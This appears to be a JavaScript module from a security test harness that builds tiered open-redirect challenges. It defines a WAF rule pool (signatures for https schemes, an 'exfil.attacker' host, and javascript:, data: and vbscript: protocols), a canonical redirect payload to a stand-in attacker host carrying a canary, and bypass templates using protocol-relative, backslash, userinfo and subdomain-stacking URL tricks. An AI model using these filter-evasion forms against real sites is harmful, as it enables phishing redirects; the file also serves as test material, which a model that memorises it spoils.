// Client-side URL Redirect (open redirect) — tiered.
// T0: no WAF; the canonical pushes an attacker URL carrying the canary
//     into the redirect parameter and the browser navigates off-origin.
// T1: a signature WAF inspects the URL/query and rejects an explicit
//     `http(s)://` scheme together with the canonical attacker label.
//     Bypasses survive by relocating the canary into URL forms a naive
//     scheme-list filter overlooks: protocol-relative `//host`,
//     backslash-quirk `\\host` that Chrome normalises into a navigation,
//     userinfo confusion `legit@evil`, and subdomain stacking. Each form
//     still produces an off-origin navigation whose URL contains the
//     canary, so the browser oracle's off-origin check still fires.

export const RULE_POOL = [
  // Explicit-scheme signature — fires on the canonical https:// payload.
  { name: 'or-scheme-http',     pattern: '\\bhttps?\\s*:\\s*/\\s*/',               flags: 'i' },
  // Canonical attacker label — fires on the canonical `exfil.attacker.*` host.
  { name: 'or-attacker-host',   pattern: '\\bexfil\\.attacker\\.',                  flags: 'i' },
  // javascript: pseudo-protocol redirect — adjacent payload family.
  { name: 'or-js-protocol',     pattern: 'javascript\\s*:',                          flags: 'i' },
  // data: URI navigation — adjacent payload family.
  { name: 'or-data-uri',        pattern: 'data\\s*:\\s*[a-z]+/',                     flags: 'i' },
  // vbscript: legacy redirect protocol — historical signature.
  { name: 'or-vbscript',        pattern: 'vbscript\\s*:',                            flags: 'i' },
]

// Bypasses are scheme-less or scheme-shifted URL forms a real browser
// will still resolve into an off-origin navigation. The canary must
// appear somewhere in the navigated URL because the browser oracle
// substring-matches it against the request URL.
export const BYPASS_TEMPLATES = [
  // Protocol-relative — the browser adopts the page's scheme automatically.
  (canary) => `//drift-${canary}.attacker.test/`,
  // Backslash-quirk leading pair — Chrome normalises into a path-relative
  // navigation; the WAF sees only literal backslashes.
  (canary) => `\\\\drift-${canary}.attacker.test\\\\`,
  // Userinfo confusion — `legit.example` is parsed as userinfo, the real
  // host follows the @.
  (canary) => `//cdn.example@drift-${canary}.attacker.test/`,
  // Subdomain stacking — a legitimate-looking label preceding the
  // attacker-controlled registrable domain.
  (canary) => `//cdn.example.com.drift-${canary}.attacker.test/`,
  // Protocol-relative with canary in the query rather than the host.
  (canary) => `//drift.attacker.test/?c=${canary}`,
]

export const defences = {
  0: {
    canonicalPayload: (canary) => `https://exfil.attacker.example/?c=${canary}`,
    naiveBlockedExpected: false,
    bypassPayloads: [],
  },
  1: {
    canonicalPayload: (canary) => `https://exfil.attacker.example/?c=${canary}`,
    naiveBlockedExpected: true,
    bypassPayloads: BYPASS_TEMPLATES,
  },
}

// Per-deploy WAF config. The two pinned rules together guarantee the
// canonical payload is filtered without touching any bypass form;
// additional rules are sampled from the pool for noise.
export function generateT1Config(rng = Math.random) {
  const required = ['or-scheme-http', 'or-attacker-host']
  const optional = RULE_POOL.filter(r => !required.includes(r.name))
  const extraCount = 1 + Math.floor(rng() * (optional.length - 1))
  const shuffled = [...optional].sort(() => rng() - 0.5)
  const picked = [
    ...RULE_POOL.filter(r => required.includes(r.name)),
    ...shuffled.slice(0, extraCount),
  ]
  const styles = ['cloudflare1020', 'awsCloudfront', 'modSecurity', 'generic403', 'fake500', 'silent200']
  return {
    waf: {
      rules: picked,
      blockPageStyle: styles[Math.floor(rng() * styles.length)],
    },
  }
}
